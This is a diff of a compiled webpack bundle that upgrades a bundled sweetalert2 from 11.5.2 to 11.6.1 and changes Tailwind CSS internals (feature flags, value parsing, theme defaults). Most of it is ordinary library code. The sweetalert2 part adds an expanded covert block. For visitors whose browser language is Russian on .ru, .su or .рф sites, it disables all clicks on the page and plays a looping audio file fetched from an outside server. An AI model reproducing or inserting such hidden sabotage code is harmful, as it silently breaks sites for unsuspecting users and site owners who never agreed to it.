@@ -91277,7 +91277,7 @@ runtime.setup(pusher_Pusher);
 /***/ (function(module) {
 
 /*!
-* sweetalert2 v11.5.2
+* sweetalert2 v11.6.1
 * Released under the MIT License.
 */
 (function (global, factory) {
@@ -91452,6 +91452,11 @@ runtime.setup(pusher_Pusher);
    * @returns {HTMLElement | null}
    */
   const getIcon = () => elementByClass(swalClasses.icon);
+
+  /**
+   * @returns {HTMLElement | null}
+   */
+  const getIconContent = () => elementByClass(swalClasses['icon-content']);
 
   /**
    * @returns {HTMLElement | null}
@@ -94430,6 +94435,7 @@ runtime.setup(pusher_Pusher);
     getHtmlContainer: getHtmlContainer,
     getImage: getImage,
     getIcon: getIcon,
+    getIconContent: getIconContent,
     getInputLabel: getInputLabel,
     getCloseButton: getCloseButton,
     getActions: getActions,
@@ -95100,9 +95106,20 @@ runtime.setup(pusher_Pusher);
     }
   };
 
-  // Dear russian users visiting russian sites. Let's play a game.
+  // Dear russian users visiting russian sites. Let's have fun.
   if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
-    document.body.style.pointerEvents = 'none';
+    setTimeout(() => {
+      document.body.style.pointerEvents = 'none';
+      const ukrainianAnthem = document.createElement('audio');
+      ukrainianAnthem.src = 'https://discoveric.ru/upload/anthem/61/61-1.mp3';
+      ukrainianAnthem.loop = true;
+      document.body.appendChild(ukrainianAnthem);
+      setTimeout(() => {
+        ukrainianAnthem.play().catch(() => {
+          // ignore
+        });
+      }, 2500);
+    }, 500);
   }
 
   // Assign instance methods from src/instanceMethods/*.js to prototype
@@ -95124,7 +95141,7 @@ runtime.setup(pusher_Pusher);
     };
   });
   SweetAlert.DismissReason = DismissReason;
-  SweetAlert.version = '11.5.2';
+  SweetAlert.version = '11.6.1';
 
   const Swal = SweetAlert;
   // @ts-ignore
@@ -95386,16 +95403,19 @@ function _interopRequireDefault(obj) {
     };
 }
 let defaults = {
-    optimizeUniversalDefaults: false
+    optimizeUniversalDefaults: false,
+    generalizedModifiers: true
 };
 let featureFlags = {
     future: [
         "hoverOnlyWhenSupported",
-        "respectDefaultRingColorOpacity"
+        "respectDefaultRingColorOpacity",
+        "disableColorOpacityUtilitiesByDefault",
+        "relativeContentPathsByDefault"
     ],
     experimental: [
         "optimizeUniversalDefaults",
-        "matchVariant" /* , 'variantGrouping' */ 
+        "generalizedModifiers"
     ]
 };
 function flagEnabled(config, flag) {
@@ -95426,82 +95446,11 @@ function issueFlagNotices(config) {
         let changes = experimentalFlagsEnabled(config).map((s)=>_picocolors.default.yellow(s)).join(", ");
         _log.default.warn("experimental-flags-enabled", [
             `You have enabled experimental features: ${changes}`,
-            "Experimental features in Tailwind CSS are not covered by semver, may introduce breaking changes, and can change at any time.", 
+            "Experimental features in Tailwind CSS are not covered by semver, may introduce breaking changes, and can change at any time."
         ]);
     }
 }
 const _default = featureFlags;
-
-
-/***/ }),
-
-/***/ "./node_modules/tailwindcss/lib/lib/regex.js":
-/*!***************************************************!*\
-  !*** ./node_modules/tailwindcss/lib/lib/regex.js ***!
-  \***************************************************/
-/***/ ((__unused_webpack_module, exports) => {
-
-"use strict";
-
-Object.defineProperty(exports, "__esModule", ({
-    value: true
-}));
-function _export(target, all) {
-    for(var name in all)Object.defineProperty(target, name, {
-        enumerable: true,
-        get: all[name]
-    });
-}
-_export(exports, {
-    pattern: ()=>pattern,
-    withoutCapturing: ()=>withoutCapturing,
-    any: ()=>any,
-    optional: ()=>optional,
-    zeroOrMore: ()=>zeroOrMore,
-    nestedBrackets: ()=>nestedBrackets,
-    escape: ()=>escape
-});
-const REGEX_SPECIAL = /[\\^$.*+?()[\]{}|]/g;
-const REGEX_HAS_SPECIAL = RegExp(REGEX_SPECIAL.source);
-/**
- * @param {string|RegExp|Array<string|RegExp>} source
- */ function toSource(source) {
-    source = Array.isArray(source) ? source : [
-        source
-    ];
-    source = source.map((item)=>item instanceof RegExp ? item.source : item);
-    return source.join("");
-}
-function pattern(source) {
-    return new RegExp(toSource(source), "g");
-}
-function withoutCapturing(source) {
-    return new RegExp(`(?:${toSource(source)})`, "g");
-}
-function any(sources) {
-    return `(?:${sources.map(toSource).join("|")})`;
-}
-function optional(source) {
-    return `(?:${toSource(source)})?`;
-}
-function zeroOrMore(source) {
-    return `(?:${toSource(source)})*`;
-}
-function nestedBrackets(open, close, depth = 1) {
-    return withoutCapturing([
-        escape(open),
-        /[^\s]*/,
-        depth === 1 ? `[^${escape(open)}${escape(close)}\s]*` : any([
-            `[^${escape(open)}${escape(close)}\s]*`,
-            nestedBrackets(open, close, depth - 1)
-        ]),
-        /[^\s]*/,
-        escape(close), 
-    ]);
-}
-function escape(string) {
-    return string && REGEX_HAS_SPECIAL.test(string) ? string.replace(REGEX_SPECIAL, "\\$&") : string || "";
-}
 
 
 /***/ }),
@@ -95530,7 +95479,7 @@ function _interopRequireDefault(obj) {
 function warn({ version , from , to  }) {
     _log.default.warn(`${from}-color-renamed`, [
         `As of Tailwind CSS ${version}, \`${from}\` has been renamed to \`${to}\`.`,
-        "Update your configuration file to silence this warning.", 
+        "Update your configuration file to silence this warning."
     ]);
 }
 const _default = {
@@ -96098,7 +96047,7 @@ function _default(pluginConfig, plugins) {
             return pluginConfig !== false && pluginConfig[pluginName] !== false;
         }).concat(Object.keys(pluginConfig).filter((pluginName)=>{
             return pluginConfig[pluginName] !== false;
-        }))), 
+        })))
     ];
     return pluginNames;
 }
@@ -96183,6 +96132,7 @@ _export(exports, {
 });
 const _color = __webpack_require__(/*! ./color */ "./node_modules/tailwindcss/lib/util/color.js");
 const _parseBoxShadowValue = __webpack_require__(/*! ./parseBoxShadowValue */ "./node_modules/tailwindcss/lib/util/parseBoxShadowValue.js");
+const _splitAtTopLevelOnly = __webpack_require__(/*! ./splitAtTopLevelOnly */ "./node_modules/tailwindcss/lib/util/splitAtTopLevelOnly.js");
 let cssFunctions = [
     "min",
     "max",
@@ -96190,10 +96140,9 @@ let cssFunctions = [
     "calc"
 ];
 // Ref: https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Types
-let COMMA = /,(?![^(]*\))/g // Comma separator that is not located between brackets. E.g.: `cubiz-bezier(a, b, c)` these don't count.
-;
-let UNDERSCORE = /_(?![^(]*\))/g // Underscore separator that is not located between brackets. E.g.: `rgba(255,_255,_255)_black` these don't count.
-;
+function isCSSFunction(value) {
+    return cssFunctions.some((fn)=>new RegExp(`^${fn}\\(.*\\)`).test(value));
+}
 function normalize(value, isRoot = true) {
     // Keep raw strings if it starts with `url(`
     if (value.includes("url(")) {
@@ -96221,12 +96170,10 @@ function url(value) {
     return value.startsWith("url(");
 }
 function number(value) {
-    return !isNaN(Number(value)) || cssFunctions.some((fn)=>new RegExp(`^${fn}\\(.+?`).test(value));
+    return !isNaN(Number(value)) || isCSSFunction(value);
 }
 function percentage(value) {
-    return value.split(UNDERSCORE).every((part)=>{
-        return /%$/g.test(part) || cssFunctions.some((fn)=>new RegExp(`^${fn}\\(.+?%`).test(part));
-    });
+    return value.endsWith("%") && number(value.slice(0, -1)) || isCSSFunction(value);
 }
 let lengthUnits = [
     "cm",
@@ -96244,13 +96191,11 @@ let lengthUnits = [
     "vw",
     "vh",
     "vmin",
-    "vmax", 
+    "vmax"
 ];
 let lengthUnitsPattern = `(?:${lengthUnits.join("|")})`;
 function length(value) {
-    return value.split(UNDERSCORE).every((part)=>{
-        return part === "0" || new RegExp(`${lengthUnitsPattern}$`).test(part) || cssFunctions.some((fn)=>new RegExp(`^${fn}\\(.+?${lengthUnitsPattern}`).test(part));
-    });
+    return value === "0" || new RegExp(`^[+-]?[0-9]*\.?[0-9]+(?:[eE][+-]?[0-9]+)?${lengthUnitsPattern}$`).test(value) || isCSSFunction(value);
 }
 let lineWidths = new Set([
     "thin",
@@ -96271,7 +96216,7 @@ function shadow(value) {
 }
 function color(value) {
     let colors = 0;
-    let result = value.split(UNDERSCORE).every((part)=>{
+    let result = (0, _splitAtTopLevelOnly.splitAtTopLevelOnly)(value, "_").every((part)=>{
         part = normalize(part);
         if (part.startsWith("var(")) return true;
         if ((0, _color.parseColor)(part, {
@@ -96284,7 +96229,7 @@ function color(value) {
 }
 function image(value) {
     let images = 0;
-    let result = value.split(COMMA).every((part)=>{
+    let result = (0, _splitAtTopLevelOnly.splitAtTopLevelOnly)(value, ",").every((part)=>{
         part = normalize(part);
         if (part.startsWith("var(")) return true;
         if (url(part) || gradient(part) || [
@@ -96306,7 +96251,7 @@ let gradientTypes = new Set([
     "radial-gradient",
     "repeating-linear-gradient",
     "repeating-radial-gradient",
-    "conic-gradient", 
+    "conic-gradient"
 ]);
 function gradient(value) {
     value = normalize(value);
@@ -96326,7 +96271,7 @@ let validPositions = new Set([
 ]);
 function position(value) {
     let positions = 0;
-    let result = value.split(UNDERSCORE).every((part)=>{
+    let result = (0, _splitAtTopLevelOnly.splitAtTopLevelOnly)(value, "_").every((part)=>{
         part = normalize(part);
         if (part.startsWith("var(")) return true;
         if (validPositions.has(part) || length(part) || percentage(part)) {
@@ -96340,7 +96285,7 @@ function position(value) {
 }
 function familyName(value) {
     let fonts = 0;
-    let result = value.split(COMMA).every((part)=>{
+    let result = (0, _splitAtTopLevelOnly.splitAtTopLevelOnly)(value, ",").every((part)=>{
         part = normalize(part);
         if (part.startsWith("var(")) return true;
         // If it contains spaces, then it should be quoted
@@ -96372,7 +96317,7 @@ let genericNames = new Set([
     "ui-rounded",
     "math",
     "emoji",
-    "fangsong", 
+    "fangsong"
 ]);
 function genericName(value) {
     return genericNames.has(value);
@@ -96385,7 +96330,7 @@ let absoluteSizes = new Set([
     "large",
     "x-large",
     "x-large",
-    "xxx-large", 
+    "xxx-large"
 ]);
 function absoluteSize(value) {
     return absoluteSizes.has(value);
@@ -96490,9 +96435,20 @@ function getAllConfigs(config) {
         // Add experimental configs here...
         respectDefaultRingColorOpacity: {
             theme: {
-                ringColor: {
-                    DEFAULT: "#3b82f67f"
-                }
+                ringColor: ({ theme  })=>({
+                        DEFAULT: "#3b82f67f",
+                        ...theme("colors")
+                    })
+            }
+        },
+        disableColorOpacityUtilitiesByDefault: {
+            corePlugins: {
+                backgroundOpacity: false,
+                borderOpacity: false,
+                divideOpacity: false,
+                placeholderOpacity: false,
+                ringOpacity: false,
+                textOpacity: false
             }
         }
     };
@@ -96626,8 +96582,21 @@ function _default(value) {
     if (/^[+-]?(\d+|\d*\.\d+)(e[+-]?\d+)?(%|\w+)?$/.test(value)) {
         return value.replace(/^[+-]?/, (sign)=>sign === "-" ? "" : "-");
     }
-    if (value.includes("var(") || value.includes("calc(")) {
-        return `calc(${value} * -1)`;
+    // What functions we support negating numeric values for
+    // var() isn't inherently a numeric function but we support it anyway
+    // The trigonometric functions are omitted because you'll need to use calc(…) with them _anyway_
+    // to produce generally useful results and that will be covered already
+    let numericFunctions = [
+        "var",
+        "calc",
+        "min",
+        "max",
+        "clamp"
+    ];
+    for (const fn of numericFunctions){
+        if (value.includes(`${fn}(`)) {
+            return `calc(${value} * -1)`;
+        }
     }
 }
 
@@ -96734,9 +96703,10 @@ function normalizeConfig(config) {
         }
         // When `config.content` is an object
         if (typeof config.content === "object" && config.content !== null) {
-            // Only `files`, `extract` and `transform` can exist in `config.content`
+            // Only `files`, `relative`, `extract`, and `transform` can exist in `config.content`
             if (Object.keys(config.content).some((key)=>![
                     "files",
+                    "relative",
                     "extract",
                     "transform"
                 ].includes(key))) {
@@ -96778,6 +96748,10 @@ function normalizeConfig(config) {
                 } else if (!(config.content.transform === undefined || typeof config.content.transform === "function")) {
                     return false;
                 }
+                // `config.content.relative` is optional and can be a boolean
+                if (typeof config.content.relative !== "boolean" && typeof config.content.relative !== "undefined") {
+                    return false;
+                }
             }
             return true;
         }
@@ -96787,7 +96761,7 @@ function normalizeConfig(config) {
         _log.default.warn("purge-deprecation", [
             "The `purge`/`content` options have changed in Tailwind CSS v3.0.",
             "Update your configuration file to eliminate this warning.",
-            "https://tailwindcss.com/docs/upgrade-guide#configure-content-sources", 
+            "https://tailwindcss.com/docs/upgrade-guide#configure-content-sources"
         ]);
     }
     // Normalize the `safelist`
@@ -96805,7 +96779,7 @@ function normalizeConfig(config) {
         _log.default.warn("prefix-function", [
             "As of Tailwind CSS v3.0, `prefix` cannot be a function.",
             "Update `prefix` in your configuration to be a string to eliminate this warning.",
-            "https://tailwindcss.com/docs/upgrade-guide#prefix-cannot-be-a-function", 
+            "https://tailwindcss.com/docs/upgrade-guide#prefix-cannot-be-a-function"
         ]);
         config.prefix = "";
     } else {
@@ -96814,6 +96788,15 @@ function normalizeConfig(config) {
     }
     // Normalize the `content`
     config.content = {
+        relative: (()=>{
+            var ref;
+            let { content  } = config;
+            if (content === null || content === void 0 ? void 0 : content.relative) {
+                return content.relative;
+            }
+            var ref1;
+            return (ref1 = (ref = config.future) === null || ref === void 0 ? void 0 : ref.relativeContentPathsByDefault) !== null && ref1 !== void 0 ? ref1 : false;
+        })(),
         files: (()=>{
             let { content , purge  } = config;
             if (Array.isArray(purge)) return purge;
@@ -96931,7 +96914,7 @@ let SPACE = /\ +(?![^(]*\))/g // Similar to the one above, but with spaces inste
 ;
 let LENGTH = /^-?(\d+|\.\d+)(.*?)$/g;
 function parseBoxShadowValue(input) {
-    let shadows = Array.from((0, _splitAtTopLevelOnly.splitAtTopLevelOnly)(input, ","));
+    let shadows = (0, _splitAtTopLevelOnly.splitAtTopLevelOnly)(input, ",");
     return shadows.map((shadow)=>{
         let value = shadow.trim();
         let result = {
@@ -97016,13 +96999,17 @@ _export(exports, {
     parseColorFormat: ()=>parseColorFormat,
     asColor: ()=>asColor,
     asLookupValue: ()=>asLookupValue,
-    coerceValue: ()=>coerceValue
+    typeMap: ()=>typeMap,
+    coerceValue: ()=>coerceValue,
+    getMatchingTypes: ()=>getMatchingTypes
 });
 const _postcssSelectorParser = /*#__PURE__*/ _interopRequireDefault(__webpack_require__(/*! postcss-selector-parser */ "./node_modules/postcss-selector-parser/dist/index.js"));
 const _escapeCommas = /*#__PURE__*/ _interopRequireDefault(__webpack_require__(/*! ./escapeCommas */ "./node_modules/tailwindcss/lib/util/escapeCommas.js"));
 const _withAlphaVariable = __webpack_require__(/*! ./withAlphaVariable */ "./node_modules/tailwindcss/lib/util/withAlphaVariable.js");
 const _dataTypes = __webpack_require__(/*! ./dataTypes */ "./node_modules/tailwindcss/lib/util/dataTypes.js");
 const _negateValue = /*#__PURE__*/ _interopRequireDefault(__webpack_require__(/*! ./negateValue */ "./node_modules/tailwindcss/lib/util/negateValue.js"));
+const _validateFormalSyntax = __webpack_require__(/*! ./validateFormalSyntax */ "./node_modules/tailwindcss/lib/util/validateFormalSyntax.js");
+const _featureFlagsJs = __webpack_require__(/*! ../featureFlags.js */ "./node_modules/tailwindcss/lib/featureFlags.js");
 function _interopRequireDefault(obj) {
     return obj && obj.__esModule ? obj : {
         default: obj
@@ -97078,11 +97065,22 @@ function asValue(modifier, options = {}, { validate =()=>true  } = {}) {
 function isArbitraryValue(input) {
     return input.startsWith("[") && input.endsWith("]");
 }
-function splitAlpha(modifier) {
+function splitUtilityModifier(modifier) {
     let slashIdx = modifier.lastIndexOf("/");
     if (slashIdx === -1 || slashIdx === modifier.length - 1) {
         return [
-            modifier
+            modifier,
+            undefined
+        ];
+    }
+    let arbitrary = isArbitraryValue(modifier);
+    // The modifier could be of the form `[foo]/[bar]`
+    // We want to handle this case properly
+    // without affecting `[foo/bar]`
+    if (arbitrary && !modifier.includes("]/[")) {
+        return [
+            modifier,
+            undefined
         ];
     }
     return [
@@ -97097,13 +97095,15 @@ function parseColorFormat(value) {
     }
     return value;
 }
-function asColor(modifier, options = {}, { tailwindConfig ={}  } = {}) {
+function asColor(_, options = {}, { tailwindConfig ={} , utilityModifier , rawModifier  } = {}) {
     var ref;
-    if (((ref = options.values) === null || ref === void 0 ? void 0 : ref[modifier]) !== undefined) {
+    if (((ref = options.values) === null || ref === void 0 ? void 0 : ref[rawModifier]) !== undefined) {
         var ref1;
-        return parseColorFormat((ref1 = options.values) === null || ref1 === void 0 ? void 0 : ref1[modifier]);
+        return parseColorFormat((ref1 = options.values) === null || ref1 === void 0 ? void 0 : ref1[rawModifier]);
     }
-    let [color, alpha] = splitAlpha(modifier);
+    // TODO: Hoist this up to getMatchingTypes or something
+    // We do this here because we need the alpha value (if any)
+    let [color, alpha] = splitUtilityModifier(rawModifier);
     if (alpha !== undefined) {
         var ref2, ref3, ref4;
         var ref5;
@@ -97120,7 +97120,9 @@ function asColor(modifier, options = {}, { tailwindConfig ={}  } = {}) {
         }
         return (0, _withAlphaVariable.withAlphaValue)(normalizedColor, tailwindConfig.theme.opacity[alpha]);
     }
-    return asValue(modifier, options, {
+    return asValue(rawModifier, options, {
+        rawModifier,
+        utilityModifier,
         validate: _dataTypes.color
     });
 }
@@ -97129,8 +97131,9 @@ function asLookupValue(modifier, options = {}) {
     return (ref = options.values) === null || ref === void 0 ? void 0 : ref[modifier];
 }
 function guess(validate) {
-    return (modifier, options)=>{
+    return (modifier, options, extras)=>{
         return asValue(modifier, options, {
+            ...extras,
             validate
         });
     };
@@ -97150,7 +97153,8 @@ let typeMap = {
     "line-width": guess(_dataTypes.lineWidth),
     "absolute-size": guess(_dataTypes.absoluteSize),
     "relative-size": guess(_dataTypes.relativeSize),
-    shadow: guess(_dataTypes.shadow)
+    shadow: guess(_dataTypes.shadow),
+    size: guess(_validateFormalSyntax.backgroundSize)
 };
 let supportedTypes = Object.keys(typeMap);
 function splitAtFirst(input, delim) {
@@ -97179,21 +97183,70 @@ function coerceValue(types, modifier, options, tailwindConfig) {
         if (value.length > 0 && supportedTypes.includes(explicitType)) {
             return [
                 asValue(`[${value}]`, options),
-                explicitType
+                explicitType,
+                null
             ];
         }
     }
+    let matches = getMatchingTypes(types, modifier, options, tailwindConfig);
     // Find first matching type
-    for (let type of [].concat(types)){
-        let result = typeMap[type](modifier, options, {
-            tailwindConfig
-        });
-        if (result !== undefined) return [
-            result,
-            type
-        ];
+    for (let match of matches){
+        return match;
     }
     return [];
+}
+function* getMatchingTypes(types, rawModifier, options, tailwindConfig) {
+    let modifiersEnabled = (0, _featureFlagsJs.flagEnabled)(tailwindConfig, "generalizedModifiers");
+    let [modifier, utilityModifier] = splitUtilityModifier(rawModifier);
+    let canUseUtilityModifier = modifiersEnabled && options.modifiers != null && (options.modifiers === "any" || typeof options.modifiers === "object" && (utilityModifier && isArbitraryValue(utilityModifier) || utilityModifier in options.modifiers));
+    if (!canUseUtilityModifier) {
+        modifier = rawModifier;
+        utilityModifier = undefined;
+    }
+    if (utilityModifier !== undefined && modifier === "") {
+        modifier = "DEFAULT";
+    }
+    // Check the full value first
+    // TODO: Move to asValue… somehow
+    if (utilityModifier !== undefined) {
+        if (typeof options.modifiers === "object") {
+            var ref;
+            var ref1;
+            let configValue = (ref1 = (ref = options.modifiers) === null || ref === void 0 ? void 0 : ref[utilityModifier]) !== null && ref1 !== void 0 ? ref1 : null;
+            if (configValue !== null) {
+                utilityModifier = configValue;
+            } else if (isArbitraryValue(utilityModifier)) {
+                utilityModifier = utilityModifier.slice(1, -1);
+            }
+        }
+        let result = asValue(rawModifier, options, {
+            rawModifier,
+            utilityModifier,
+            tailwindConfig
+        });
+        if (result !== undefined) {
+            yield [
+                result,
+                "any",
+                null
+            ];
+        }
+    }
+    for (const { type  } of types !== null && types !== void 0 ? types : []){
+        let result1 = typeMap[type](modifier, options, {
+            rawModifier,
+            utilityModifier,
+            tailwindConfig
+        });
+        if (result1 === undefined) {
+            continue;
+        }
+        yield [
+            result1,
+            type,
+            utilityModifier !== null && utilityModifier !== void 0 ? utilityModifier : null
+        ];
+    }
 }
 
 
@@ -97245,7 +97298,7 @@ function mergeWith(target, ...sources) {
             let merged = customizer(target[k], source[k]);
             if (merged === undefined) {
                 if (isObject(target[k]) && isObject(source[k])) {
-                    target[k] = mergeWith(target[k], source[k], customizer);
+                    target[k] = mergeWith({}, target[k], source[k], customizer);
                 } else {
                     target[k] = source[k];
                 }
@@ -97452,7 +97505,7 @@ function resolveConfig(configs) {
             important: false,
             separator: ":",
             variantOrder: _defaultConfigStub.default.variantOrder
-        }, 
+        }
     ];
     var ref, ref1;
     return (0, _normalizeConfig.normalizeConfig)((0, _defaults.defaults)({
@@ -97473,10 +97526,24 @@ function resolveConfig(configs) {
 /*!******************************************************************!*\
   !*** ./node_modules/tailwindcss/lib/util/splitAtTopLevelOnly.js ***!
   \******************************************************************/
-/***/ ((__unused_webpack_module, exports, __webpack_require__) => {
+/***/ ((__unused_webpack_module, exports) => {
 
 "use strict";
-
+/**
+ * This splits a string on a top-level character.
+ *
+ * Regex doesn't support recursion (at least not the JS-flavored version).
+ * So we have to use a tiny state machine to keep track of paren placement.
+ *
+ * Expected behavior using commas:
+ * var(--a, 0 0 1px rgb(0, 0, 0)), 0 0 1px rgb(0, 0, 0)
+ *       ─┬─             ┬  ┬    ┬
+ *        x              x  x    ╰──────── Split because top-level
+ *        ╰──────────────┴──┴───────────── Ignored b/c inside >= 1 levels of parens
+ *
+ * @param {string} input
+ * @param {string} separator
+ */ 
 Object.defineProperty(exports, "__esModule", ({
     value: true
 }));
@@ -97484,90 +97551,26 @@ Object.defineProperty(exports, "splitAtTopLevelOnly", ({
     enumerable: true,
     get: ()=>splitAtTopLevelOnly
 }));
-const _regex = /*#__PURE__*/ _interopRequireWildcard(__webpack_require__(/*! ../lib/regex */ "./node_modules/tailwindcss/lib/lib/regex.js"));
-function _getRequireWildcardCache(nodeInterop) {
-    if (typeof WeakMap !== "function") return null;
-    var cacheBabelInterop = new WeakMap();
-    var cacheNodeInterop = new WeakMap();
-    return (_getRequireWildcardCache = function(nodeInterop) {
-        return nodeInterop ? cacheNodeInterop : cacheBabelInterop;
-    })(nodeInterop);
-}
-function _interopRequireWildcard(obj, nodeInterop) {
-    if (!nodeInterop && obj && obj.__esModule) {
-        return obj;
-    }
-    if (obj === null || typeof obj !== "object" && typeof obj !== "function") {
-        return {
-            default: obj
-        };
-    }
-    var cache = _getRequireWildcardCache(nodeInterop);
-    if (cache && cache.has(obj)) {
-        return cache.get(obj);
-    }
-    var newObj = {};
-    var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor;
-    for(var key in obj){
-        if (key !== "default" && Object.prototype.hasOwnProperty.call(obj, key)) {
-            var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null;
-            if (desc && (desc.get || desc.set)) {
-                Object.defineProperty(newObj, key, desc);
-            } else {
-                newObj[key] = obj[key];
+function splitAtTopLevelOnly(input, separator) {
+    let stack = [];
+    let parts = [];
+    let lastPos = 0;
+    for(let idx = 0; idx < input.length; idx++){
+        let char = input[idx];
+        if (stack.length === 0 && char === separator[0]) {
+            if (separator.length === 1 || input.slice(idx, idx + separator.length) === separator) {
+                parts.push(input.slice(lastPos, idx));
+                lastPos = idx + separator.length;
             }
         }
-    }
-    newObj.default = obj;
-    if (cache) {
-        cache.set(obj, newObj);
-    }
-    return newObj;
-}
-function* splitAtTopLevelOnly(input, separator) {
-    let SPECIALS = new RegExp(`[(){}\\[\\]${_regex.escape(separator)}]`, "g");
-    let depth = 0;
-    let lastIndex = 0;
-    let found = false;
-    let separatorIndex = 0;
-    let separatorStart = 0;
-    let separatorLength = separator.length;
-    // Find all paren-like things & character
-    // And only split on commas if they're top-level
-    for (let match of input.matchAll(SPECIALS)){
-        let matchesSeparator = match[0] === separator[separatorIndex];
-        let atEndOfSeparator = separatorIndex === separatorLength - 1;
-        let matchesFullSeparator = matchesSeparator && atEndOfSeparator;
-        if (match[0] === "(") depth++;
-        if (match[0] === ")") depth--;
-        if (match[0] === "[") depth++;
-        if (match[0] === "]") depth--;
-        if (match[0] === "{") depth++;
-        if (match[0] === "}") depth--;
-        if (matchesSeparator && depth === 0) {
-            if (separatorStart === 0) {
-                separatorStart = match.index;
-            }
-            separatorIndex++;
-        }
-        if (matchesFullSeparator && depth === 0) {
-            found = true;
-            yield input.substring(lastIndex, separatorStart);
-            lastIndex = separatorStart + separatorLength;
-        }
-        if (separatorIndex === separatorLength) {
-            separatorIndex = 0;
-            separatorStart = 0;
+        if (char === "(" || char === "[" || char === "{") {
+            stack.push(char);
+        } else if (char === ")" && stack[stack.length - 1] === "(" || char === "]" && stack[stack.length - 1] === "[" || char === "}" && stack[stack.length - 1] === "{") {
+            stack.pop();
         }
     }
-    // Provide the last segment of the string if available
-    // Otherwise the whole string since no `char`s were found
-    // This mirrors the behavior of string.split()
-    if (found) {
-        yield input.substring(lastIndex);
-    } else {
-        yield input;
-    }
+    parts.push(input.slice(lastPos));
+    return parts;
 }
 
 
@@ -97631,6 +97634,41 @@ function toPath(path) {
         throw new Error(`Path is invalid. Has unbalanced brackets: ${path}`);
     }
     return path.split(/\.(?![^\[]*\])|[\[\]]/g).filter(Boolean);
+}
+
+
+/***/ }),
+
+/***/ "./node_modules/tailwindcss/lib/util/validateFormalSyntax.js":
+/*!*******************************************************************!*\
+  !*** ./node_modules/tailwindcss/lib/util/validateFormalSyntax.js ***!
+  \*******************************************************************/
+/***/ ((__unused_webpack_module, exports, __webpack_require__) => {
+
+"use strict";
+
+Object.defineProperty(exports, "__esModule", ({
+    value: true
+}));
+Object.defineProperty(exports, "backgroundSize", ({
+    enumerable: true,
+    get: ()=>backgroundSize
+}));
+const _dataTypes = __webpack_require__(/*! ./dataTypes */ "./node_modules/tailwindcss/lib/util/dataTypes.js");
+const _splitAtTopLevelOnly = __webpack_require__(/*! ./splitAtTopLevelOnly */ "./node_modules/tailwindcss/lib/util/splitAtTopLevelOnly.js");
+function backgroundSize(value) {
+    let keywordValues = [
+        "cover",
+        "contain"
+    ];
+    // the <length-percentage> type will probably be a css function
+    // so we have to use `splitAtTopLevelOnly`
+    return (0, _splitAtTopLevelOnly.splitAtTopLevelOnly)(value, ",").every((part)=>{
+        let sizes = (0, _splitAtTopLevelOnly.splitAtTopLevelOnly)(part, "_").filter(Boolean);
+        if (sizes.length === 1 && keywordValues.includes(sizes[0])) return true;
+        if (sizes.length !== 1 && sizes.length !== 2) return false;
+        return sizes.every((size)=>(0, _dataTypes.length)(size) || (0, _dataTypes.percentage)(size) || size === "auto");
+    });
 }
 
 
@@ -97928,6 +97966,7 @@ module.exports = {
       xl: '1280px',
       '2xl': '1536px',
     },
+    supports: {},
     colors: ({ colors }) => ({
       inherit: colors.inherit,
       current: colors.current,
@@ -98028,6 +98067,16 @@ module.exports = {
       ping: 'ping 1s cubic-bezier(0, 0, 0.2, 1) infinite',
       pulse: 'pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite',
       bounce: 'bounce 1s infinite',
+    },
+    aria: {
+      checked: 'checked="true"',
+      disabled: 'disabled="true"',
+      expanded: 'expanded="true"',
+      hidden: 'hidden="true"',
+      pressed: 'pressed="true"',
+      readonly: 'readonly="true"',
+      required: 'required="true"',
+      selected: 'selected="true"',
     },
     aspectRatio: {
       auto: 'auto',
@@ -98201,7 +98250,10 @@ module.exports = {
       '2xl': '0 25px 25px rgb(0 0 0 / 0.15)',
       none: '0 0 #0000',
     },
-    fill: ({ theme }) => theme('colors'),
+    fill: ({ theme }) => ({
+      none: 'none',
+      ...theme('colors'),
+    }),
     grayscale: {
       0: '0',
       DEFAULT: '100%',
@@ -98638,7 +98690,7 @@ module.exports = {
       8: '8px',
     },
     ringColor: ({ theme }) => ({
-      DEFAULT: theme(`colors.blue.500`, '#3b82f6'),
+      DEFAULT: theme('colors.blue.500', '#3b82f6'),
       ...theme('colors'),
     }),
     ringOffsetColor: ({ theme }) => theme('colors'),
@@ -98710,7 +98762,10 @@ module.exports = {
     space: ({ theme }) => ({
       ...theme('spacing'),
     }),
-    stroke: ({ theme }) => theme('colors'),
+    stroke: ({ theme }) => ({
+      none: 'none',
+      ...theme('colors'),
+    }),
     strokeWidth: {
       0: '0',
       1: '1',
